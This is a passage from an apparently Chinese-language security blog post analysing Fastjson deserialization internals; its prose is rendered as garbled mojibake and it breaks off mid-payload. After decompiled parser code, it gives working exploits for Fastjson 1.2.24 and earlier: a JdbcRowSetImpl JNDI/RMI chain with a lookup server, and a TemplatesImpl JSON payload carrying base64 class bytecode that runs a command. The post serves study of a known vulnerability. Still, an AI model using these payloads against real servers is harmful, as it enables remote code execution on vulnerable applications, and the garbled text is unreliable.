        ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type);
        if (derializer != null) {
            return (ObjectDeserializer)derializer;
        } else {
            JSONType annotation = (JSONType)clazz.getAnnotation(JSONType.class);
            if (annotation != null) {
                Class&lt;?&gt; mappingTo = annotation.mappingTo();
                if (mappingTo != Void.class) {
                    return this.getDeserializer(mappingTo, mappingTo);
                }
            }

            if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) {
                derializer = (ObjectDeserializer)this.derializers.get(clazz);
            }

            if (derializer != null) {
                return (ObjectDeserializer)derializer;
            } else {
                String className = clazz.getName();
                className = className.replace('$', '.');

                for(int i = 0; i &lt; this.denyList.length; ++i) {
                    String deny = this.denyList[i];
                    if (className.startsWith(deny)) {
                        throw new JSONException(&quot;parser deny : &quot; + className);
                    }
                }

                if (className.startsWith(&quot;java.awt.&quot;) &amp;&amp; AwtCodec.support(clazz) &amp;&amp; !awtError) {
                    try {
                        this.derializers.put(Class.forName(&quot;java.awt.Point&quot;), AwtCodec.instance);
                        this.derializers.put(Class.forName(&quot;java.awt.Font&quot;), AwtCodec.instance);
                        this.derializers.put(Class.forName(&quot;java.awt.Rectangle&quot;), AwtCodec.instance);
                        this.derializers.put(Class.forName(&quot;java.awt.Color&quot;), AwtCodec.instance);
                    } catch (Throwable var11) {
                        awtError = true;
                    }

                    derializer = AwtCodec.instance;
                }

                if (!jdk8Error) {
                    try {
                        if (className.startsWith(&quot;java.time.&quot;)) {
                            this.derializers.put(Class.forName(&quot;java.time.LocalDateTime&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.LocalDate&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.LocalTime&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.ZonedDateTime&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.OffsetDateTime&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.OffsetTime&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.ZoneOffset&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.ZoneRegion&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.ZoneId&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.Period&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.Duration&quot;), Jdk8DateCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.time.Instant&quot;), Jdk8DateCodec.instance);
                            derializer = (ObjectDeserializer)this.derializers.get(clazz);
                        } else if (className.startsWith(&quot;java.util.Optional&quot;)) {
                            this.derializers.put(Class.forName(&quot;java.util.Optional&quot;), OptionalCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.util.OptionalDouble&quot;), OptionalCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.util.OptionalInt&quot;), OptionalCodec.instance);
                            this.derializers.put(Class.forName(&quot;java.util.OptionalLong&quot;), OptionalCodec.instance);
                            derializer = (ObjectDeserializer)this.derializers.get(clazz);
                        }
                    } catch (Throwable var10) {
                        jdk8Error = true;
                    }
                }

                if (className.equals(&quot;java.nio.file.Path&quot;)) {
                    this.derializers.put(clazz, MiscCodec.instance);
                }

                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

                try {
                    Iterator var17 = ServiceLoader.load(AutowiredObjectDeserializer.class, classLoader).iterator();

                    while(var17.hasNext()) {
                        AutowiredObjectDeserializer autowired = (AutowiredObjectDeserializer)var17.next();
                        Iterator var8 = autowired.getAutowiredFor().iterator();

                        while(var8.hasNext()) {
                            Type forType = (Type)var8.next();
                            this.derializers.put(forType, autowired);
                        }
                    }
                } catch (Exception var12) {
                }

                if (derializer == null) {
                    derializer = (ObjectDeserializer)this.derializers.get(type);
                }

                if (derializer != null) {
                    return (ObjectDeserializer)derializer;
                } else {
                    if (clazz.isEnum()) {
                        derializer = new EnumDeserializer(clazz);
                    } else if (clazz.isArray()) {
                        derializer = ObjectArrayCodec.instance;
                    } else if (clazz != Set.class &amp;&amp; clazz != HashSet.class &amp;&amp; clazz != Collection.class &amp;&amp; clazz != List.class &amp;&amp; clazz != ArrayList.class) {
                        if (Collection.class.isAssignableFrom(clazz)) {
                            derializer = CollectionCodec.instance;
                        } else if (Map.class.isAssignableFrom(clazz)) {
                            derializer = MapDeserializer.instance;
                        } else if (Throwable.class.isAssignableFrom(clazz)) {
                            derializer = new ThrowableDeserializer(this, clazz);
                        } else {
                            derializer = this.createJavaBeanDeserializer(clazz, (Type)type);
                        }
                    } else {
                        derializer = CollectionCodec.instance;
                    }

                    this.putDeserializer((Type)type, (ObjectDeserializer)derializer);
                    return (ObjectDeserializer)derializer;
                }
            }
        }
    }
}
</code></pre>
<p>createJavaBeanDeserializeræ–¹æ³•</p>
<p>æœ‰å¾ˆå¤šå…³äº ASM å‰ç½®çš„æ£€æŸ¥ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹‹åå†çœ‹ï¼Œ<code>JavaBeanInfo.build</code>å¼€å§‹æ­£å¼æ„é€  beanInfoï¼Œæ­¥å…¥</p>
<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749492822049.png" alt="" loading="lazy"></figure>
<p>build æ–¹æ³•æœ¬èº«æ˜¯è¿”å›ä¸€ä¸ª JavaBeanInfo åˆ—è¡¨ï¼ŒjavaBeanInfoé‡Œé¢å‚¨å­˜äº†å³å°†ååºåˆ—åŒ–beanä¸­çš„setæ–¹æ³•ï¼Œgetæ–¹æ³•ï¼Œæ— å‚æ„é€ æ–¹æ³•ï¼Œå±æ€§å€¼ç­‰å…·ä½“ä¿¡æ¯ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢æœ‰å¾ˆå¤šæ£€æŸ¥çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å…ˆä¸çœ‹ï¼Œç›´æ¥çœ‹æœ€é‡è¦çš„3ä¸ªforå¾ªç¯</p>
<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749492822064.png" alt="" loading="lazy"></figure>
<p>ç¬¬ä¸€ä¸ª for å¾ªç¯æ˜¯ç”¨æ¥è·å– set æ–¹æ³•ï¼Œç¬¬äºŒä¸ª for å¾ªç¯æ˜¯ç”¨æ¥è·å–å­—æ®µå±æ€§ï¼Œç¬¬ä¸‰ä¸ª for å¾ªç¯æ˜¯åœ¨è·å– get æ–¹æ³•</p>
<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749492822080.png" alt="" loading="lazy"></figure>
<p>æˆ‘ä»¬å…ˆå…·ä½“çœ‹ç¬¬ä¸€ä¸ªforï¼Œæœ‰å››ä¸ª if åˆ¤æ–­</p>
<p>æ–¹æ³•åé•¿åº¦å¤§äº4ä¸”ä»¥setå¼€å¤´ï¼Œä¸”ç¬¬å››ä¸ªå­—æ¯è¦æ˜¯å¤§å†™<br>
éé™æ€æ–¹æ³•<br>
è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»<br>
å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</p>
<pre><code class="language-java">Method[] var30 = methods;
int var29 = methods.length;

Method method;
for(i = 0; i &lt; var29; ++i) {
    method = var30[i];
    ordinal = 0;
    int serialzeFeatures = 0;
    parserFeatures = 0;
    String methodName = method.getName();
    if (methodName.length() &gt;= 4 &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {
        Class&lt;?&gt;[] types = method.getParameterTypes();
        if (types.length == 1) {
            annotation = (JSONField)method.getAnnotation(JSONField.class);
            if (annotation == null) {
                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);
            }

            if (annotation != null) {
                if (!annotation.deserialize()) {
                    continue;
                }

                ordinal = annotation.ordinal();
                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());
                parserFeatures = Feature.of(annotation.parseFeatures());
                if (annotation.name().length() != 0) {
                    methodName = annotation.name();
                    add(fieldList, new FieldInfo(methodName, method, (Field)null, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, (JSONField)null, (String)null));
                    continue;
                }
            }

            if (methodName.startsWith(&quot;set&quot;)) {
                c3 = methodName.charAt(3);
                String propertyName;
                if (!Character.isUpperCase((char)c3) &amp;&amp; c3 &lt;= 512) {
                    if (c3 == 95) {
                        propertyName = methodName.substring(4);
                    } else if (c3 == 102) {
                        propertyName = methodName.substring(3);
                    } else {
                        if (methodName.length() &lt; 5 || !Character.isUpperCase(methodName.charAt(4))) {
                            continue;
                        }

                        propertyName = TypeUtils.decapitalize(methodName.substring(3));
                    }
                } else if (TypeUtils.compatibleWithJavaBean) {
                    propertyName = TypeUtils.decapitalize(methodName.substring(3));
                } else {
                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
                }

                Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
                if (field == null &amp;&amp; types[0] == Boolean.TYPE) {
                    isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
                    field = TypeUtils.getField(clazz, isFieldName, declaredFields);
                }

                JSONField fieldAnnotation = null;
                if (field != null) {
                    fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);
                    if (fieldAnnotation != null) {
                        if (!fieldAnnotation.deserialize()) {
                            continue;
                        }

                        ordinal = fieldAnnotation.ordinal();
                        serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());
                        parserFeatures = Feature.of(fieldAnnotation.parseFeatures());
                        if (fieldAnnotation.name().length() != 0) {
                            propertyName = fieldAnnotation.name();
                            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));
                            continue;
                        }
                    }
                }

                if (propertyNamingStrategy != null) {
                    propertyName = propertyNamingStrategy.translate(propertyName);
                }

                add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));
            }
        }
    }
}
</code></pre>
<p>å®ƒæœ€ç»ˆä¼šè¢« add è¿› fieldInfo æ•°ç»„ï¼Œç„¶åè¿™é‡Œå°±æ²¡ä»€ä¹ˆå¥½çœ‹çš„äº†</p>
<p>èµ°å®Œè¿™é‡Œå°±å¼€å§‹çœŸæ­£è§£æäº†ï¼ŒASM è§£æå™¨çš„åŸå› æˆ‘ä»¬å¹¶ä¸èƒ½çœ‹åˆ°å…·ä½“çš„å†…å®¹ï¼Œç›´æ¥çœ‹æºç åˆ†æ</p>
<p>å½“æ¥åˆ° createInstance æ–¹æ³•ï¼Œå®ƒé¦–å…ˆæ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªç©ºç±»ï¼Œé‡Œé¢çš„å±æ€§å€¼éƒ½ä¸ºé»˜è®¤</p>
<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749492822096.png" alt="" loading="lazy"></figure>
<p>è°ƒç”¨setvalueæ–¹æ³•ï¼Œåå°„è°ƒç”¨setæ–¹æ³•</p>
<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749492822111.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œä¹Ÿå°±æ˜¯åˆ©ç”¨ç‚¹æ‰€åœ¨äº†</p>
<h1 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h1>
<p>ç”±å‰é¢çŸ¥é“ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šå°†ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€<code>getter</code>æ–¹æ³•ã€<code>setter</code>æ–¹æ³•æ‰§è¡Œä¸€éï¼Œå¦‚æœè¿™ä¸‰ç§æ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å¯èƒ½å¯¼è‡´ååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨</p>
<p>ç®€å•åˆ©ç”¨ï¼š</p>
<p>åœ¨setæ–¹æ³•ä¸‹é¢æ’å…¥å¼¹è®¡ç®—å™¨çš„å‘½ä»¤</p>
<pre><code class="language-java">package org.example;

import java.io.IOException;

public class Main {
  public String name=&quot;&quot;;
  public int age;
  protected String sex=&quot;&quot;;

    public Main() {
    }

    public Main(String name, int age, String sex) {
        this.name = name;
        this.age = age;
        this.sex = sex;
    }

    public String getName() {
        System.out.println(&quot;è°ƒç”¨äº†getNameæ–¹æ³•&quot;);
        return name;
    }

    public void setName(String name) {
        System.out.println(&quot;è°ƒç”¨äº†setNameæ–¹æ³•&quot;);
        this.name = name;
    }

    public int getAge() throws IOException {
        System.out.println(&quot;è°ƒç”¨äº†getAgeæ–¹æ³•&quot;);
        return age;

    }

    public void setAge(int age) throws IOException {
        System.out.println(&quot;è°ƒç”¨äº†SetAgeæ–¹æ³•&quot;);
        Runtime.getRuntime().exec(&quot;calc&quot;);
        this.age = age;
    }

    public String getSex() {
        System.out.println(&quot;è°ƒç”¨äº†getSexæ–¹æ³•&quot;);
        return sex;
    }

    public void setSex(String sex) {
        System.out.println(&quot;è°ƒç”¨äº†setSexæ–¹æ³•&quot;);
        this.sex = sex;
    }

}
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

import java.io.IOException;

public class text{
    public static void main(String[] args) throws IOException {
        Main main = new Main();
        // main.setName(&quot;Bloyet&quot;);
        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
        System.out.println(fastjson);
        Object main1 = JSON.parseObject(fastjson);
        System.out.println(main1);

    }
}
</code></pre>
<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749492822127.png" alt="" loading="lazy"></figure>
<p>å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ï¼Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è°ƒç”¨getteræ–¹æ³•ï¼Œç„¶ååœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±éƒ½ä¼šè°ƒç”¨</p>
<p>FastJsonä¸­çš„ <code>parse()</code> å’Œ <code>parseObject()</code> æ–¹æ³•éƒ½å¯ä»¥ç”¨æ¥å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–æˆJavaå¯¹è±¡ï¼Œ<code>parseObject()</code> æœ¬è´¨ä¸Šä¹Ÿæ˜¯è°ƒç”¨ <code>parse()</code> è¿›è¡Œååºåˆ—åŒ–çš„ã€‚ä½†æ˜¯ <code>parseObject()</code> ä¼šé¢å¤–çš„å°†Javaå¯¹è±¡è½¬ä¸º JSONObjectå¯¹è±¡ï¼Œå³ <code>JSON.toJSON()</code>ã€‚æ‰€ä»¥è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œ<code>parse()</code> ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ <code>setter</code> æ–¹æ³•åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ <code>getter</code> æ–¹æ³•ï¼Œè€Œ <code>parseObject()</code> ç”±äºå¤šæ‰§è¡Œäº† <code>JSON.toJSON(obj)</code>ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„æ‰€æœ‰ <code>setter</code> å’Œ <code>getter</code> æ–¹æ³•ã€‚</p>
<p>è¡¥å……ä¸€ä¸‹pocçš„å†™æ³•</p>
<p>ä¸€èˆ¬çš„ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„PoCå†™æ³•å¦‚ä¸‹ï¼Œ@typeæŒ‡å®šäº†ååºåˆ—åŒ–å¾—åˆ°çš„ç±»</p>
<pre><code class="language-java">{
&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,
&quot;xxx&quot;:&quot;xxx&quot;,
...
}
</code></pre>
<h1 id="fastjson1224åˆ©ç”¨é“¾">Fastjson&lt;=1.2.24åˆ©ç”¨é“¾</h1>
<p>è¿™ä¸ªç‰ˆæœ¬ ä¸»è¦æ˜¯æœ‰ä¸¤ä¸ªåˆ©ç”¨é“¾JdbcRowSetImplå’ŒTemplateslmpl</p>
<h2 id="jdbcrowsetimpl">JdbcRowSetImpl</h2>
<p>æˆ‘ä»¬å…ˆæ¥åˆ†æJdbcRowSetImplï¼ˆç»“åˆJNDIæ³¨å…¥ï¼‰</p>
<p>JdbcRowSetImplä¸­æœ‰ä¸¤ä¸ªæ–¹æ³•ç¬¦åˆè‡ªåŠ¨è°ƒç”¨å¹¶ä¸”å¯ä»¥è¿›è¡Œåˆ©ç”¨çš„ï¼š</p>
<p>JdbcRowSetImpl#setDataSourceName</p>
<pre><code class="language-java">public void setDataSourceName(String var1) throws SQLException {
    if (this.getDataSourceName() != null) {
        if (!this.getDataSourceName().equals(var1)) {
            super.setDataSourceName(var1);
            this.conn = null;
            this.ps = null;
            this.rs = null;
        }
    } else {
        super.setDataSourceName(var1);
    }

}
</code></pre>
<p>JdbcRowSetImpl#setAutoCommit</p>
<pre><code class="language-java">public void setAutoCommit(boolean var1) throws SQLException {
    if (this.conn != null) {
        this.conn.setAutoCommit(var1);
    } else {
        this.conn = this.connect();
        this.conn.setAutoCommit(var1);
    }

}
</code></pre>
<p>åœ¨JdbcRowSetImpl#setAutoCommit ä¸­è°ƒç”¨äº†connect()æ–¹æ³•</p>
<p>JdbcRowSetImpl#connect</p>
<pre><code class="language-java">private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
</code></pre>
<p>å›é¡¾ä¸€ä¸‹InitialContextç±»çš„ä½œç”¨</p>
<p><code>InitialContext</code> æä¾›äº†ä¸€ä¸ªé»˜è®¤çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œå…è®¸åº”ç”¨ç¨‹åºåœ¨å…¶ä¸­æŸ¥æ‰¾å’Œç»‘å®šå¯¹è±¡ã€‚</p>
<p>ç„¶åå®ƒè¿˜è°ƒç”¨äº†lookupæ–¹æ³•ï¼Œå‚æ•°è¿˜åˆšå¥½å°±æ˜¯æˆ‘ä»¬åœ¨setDataSourceNameæ–¹æ³•ä¸­å¯ä»¥æ§åˆ¶çš„ï¼Œç»“åˆèµ·æ¥å°±å¯ä»¥è¿›è¡ŒJNDIæ³¨å…¥äº†</p>
<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749492822143.png" alt="" loading="lazy"></figure>
<h3 id="jndirmi">JNDI+RMI</h3>
<p>å¼€å¯æœåŠ¡</p>
<pre><code class="language-java">package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class JNDI_server {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
    }
}
</code></pre>
<p>ç„¶ååœ¨å¼€å¯pythonæœåŠ¡</p>
<p>ç„¶åå°±æ˜¯EXP</p>
<pre><code class="language-java">package org.example;
import com.alibaba.fastjson.JSON;


public class JdbcRowSetImplEXP {
    public static void main(String[] args) {

        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
    }
}
</code></pre>
<p>åŸºæœ¬ä¸Šå°±æ˜¯JNDI+RMIä¹±æ‰“ï¼Œé€šè¿‡fastjsonçš„ååºåˆ—åŒ–å†’å……äº†æˆ‘ä»¬ä¹‹å‰çš„å®¢æˆ·ç«¯</p>
<h3 id="jndildap">JNDI+LDAP</h3>
<p>å·®ä¸å¤šJNDIå¯ä»¥åˆ©ç”¨çš„è¿™é‡Œéƒ½æ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œå°±ä¸å†™äº†</p>
<h2 id="templatesimpl">TemplatesImpl</h2>
<p>è¯¥é“¾çš„åˆ©ç”¨é¢è¾ƒçª„ï¼Œç”±äºpayloadéœ€è¦èµ‹å€¼çš„ä¸€äº›å±æ€§ä¸º<code>private</code>ç±»å‹ï¼Œéœ€è¦åœ¨<code>parse()</code>ååºåˆ—åŒ–æ—¶è®¾ç½®ç¬¬äºŒä¸ªå‚æ•°<code>Feature.SupportNonPublicField</code>ï¼ŒæœåŠ¡ç«¯æ‰èƒ½ä»JSONä¸­æ¢å¤<code>private</code>ç±»å‹çš„å±æ€§ã€‚</p>
<p>ç”±äºéƒ¨åˆ†éœ€è¦æˆ‘ä»¬æ›´æ”¹çš„ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œéœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</p>
<p>è¿™ä¸ªç±»å°±å¾ˆç†Ÿæ‚‰äº†ï¼Œæˆ‘ä»¬ä¹‹å‰åœ¨æ‰“cbé“¾çš„æ—¶å€™ä¹Ÿåˆ©ç”¨åˆ°äº†getteræ–¹æ³•çš„ç‰¹æ€§è¿›è¡Œç±»åŠ è½½</p>
<pre><code class="language-java">TemplatesImpl.getOutputProperties
      TemplatesImpl.newTransformer
</code></pre>
<p>æˆ‘ä»¬è¿˜éœ€è¦æ»¡è¶³ <code>_name</code> ä¸ä¸º null ï¼Œ<code>_tfactory</code> ä¸ä¸º null  è¿™äº›éƒ½æ˜¯CC3çš„å†…å®¹äº†ï¼Œè¿™é‡Œå°±ä¸å¤šèµ˜è¿°</p>
<p>ç„¶ååˆå› ä¸ºåœ¨fastjsonä¸­æˆ‘ä»¬ä¼ å…¥çš„_bytecodesä¸ºbytesç±»å‹ï¼Œè€ŒFastjsonåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå°†bytesç±»å‹è¿›è¡Œbase64ç¼–ç ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè¿›è¡Œè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¼ å…¥å­—èŠ‚ç çš„æ—¶å€™è¿˜éœ€è¦è¿›è¡Œç¼–ç </p>
<p>ç¼–ç ï¼š</p>
<pre><code class="language-java">package org.example;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class text2 {
    public static void main(String[] args) throws ClassNotFoundException, IOException {
        byte[] _bytecodess = Files.readAllBytes(Paths.get(&quot;H:\\http.class&quot;));
        String base64Encoded = Base64.getEncoder().encodeToString(_bytecodess);
        System.out.println(base64Encoded);
    }
}
</code></pre>
<p>jsonæ ¼å¼ï¼š</p>
<pre><code class="language-java">{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMdGV4dC9odHRwOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACWh0dHAuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAzAAoBAAl0ZXh0L2h0dHABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABgADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB0ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABIADAAQAA0AEQARABMADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==&quot;],&quot;_tfactory&quot;:{ },&quot;_name&quot;:&quot;Bloyet&quot;,&quot;_outputProperties&quot;:{}}
</code></pre>
<p>EXPï¼š</p>
<pre><code class="language-java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class TemplateImplEXP {
    public static void main(String[] args) {

        String EXP = &quot;{\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMdGV4dC9odHRwOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4a